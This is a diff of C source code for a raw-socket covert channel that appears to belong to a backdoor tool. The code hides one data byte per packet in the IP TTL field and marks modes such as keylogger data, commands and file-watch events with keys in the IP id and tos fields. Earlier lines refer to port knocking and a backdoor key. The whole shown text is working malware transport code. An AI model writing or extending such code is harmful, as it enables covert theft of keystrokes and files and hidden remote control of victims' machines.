@@ -111,6 +111,7 @@ void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned s
     covert_udp_send(sip,dip,sport,dport,buf, 3);
 
 }
+
 void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int covert_channel){
     char datagram[4096] , source_ip[32] , *pseudoheader;
     int sending_socket;
@@ -218,7 +219,7 @@ unsigned short csum(unsigned short *ptr,int nbytes){
 }
 
 
-void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int covert_channel) {
+void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int flags) {
     int bytes_sent;
     int sending_socket;
     struct sockaddr_in sin;
@@ -237,32 +238,36 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
         return;
     }
 
-    //sleep(1);
-
     //create IP header
     packet.ip.ihl = 5;
     packet.ip.version = 4;
     //packet.ip.tos = 0;        //lets mess with this
     packet.ip.tot_len = htons(40);
 
-
-    if(covert_channel == 1) {
+    //set the IP id, ttl, and tos fields
+    if(flags == DATA) {
         //regular tcp covert channel
-        packet.ip.id = data[0];
-        printf("sending: %c\n", data[0]);
-        packet.ip.tos = 0;
-    }else if(covert_channel == 2){
-        //key for port knocking
-        packet.ip.id = 'l';  //enter a single ASCII character into the field
-        packet.ip.tos = 'b';
-    }else {
-        //key for backdoor
-        packet.ip.id = 'b';  //enter a single ASCII character into the field
-        packet.ip.tos = 'l';
+        packet.ip.id = DATA_KEY;
+        packet.ip.tos = DATA_KEY;
+    }else if(flags == KEYLOGGER){
+        packet.ip.id = KEYLOGGER_KEY;
+        packet.ip.tos = KEYLOGGER_KEY;
+    }else if(flags == COMMAND){
+        packet.ip.id = COMMAND_KEY;
+        packet.ip.tos = COMMAND_KEY;
+    }else if(flags == INOTIFY){
+        packet.ip.id = INOTIFY_KEY;
+        packet.ip.tos = INOTIFY_KEY;
+    }else if(flags == EOT){
+        packet.ip.id = EOT_KEY;
+        packet.ip.tos = EOT_KEY;
     }
 
+    packet.ip.ttl = data[0];
+    printf("DEBUG: sending: %c\n", data[0]);
+    printf("DEBUG: command: %d\n", flags);
+
     packet.ip.frag_off = 0;
-    packet.ip.ttl = 64;
     packet.ip.protocol = IPPROTO_TCP;
     packet.ip.check = 0;
     packet.ip.saddr = sip_binary;
@@ -331,7 +336,7 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
         //if((bytes_sent = send(sending_socket, &packet, 40, 0, (struct sockaddr *)&sin, sizeof(sin))) < 0) {
         perror("sendto");
     }
-    }
+}
     char covert_udp_recv(char *sip, int sport, bool ttl, bool tos, bool ipid) {
         struct sockaddr_in sin;
         int recv_socket, n, bytes_recv;
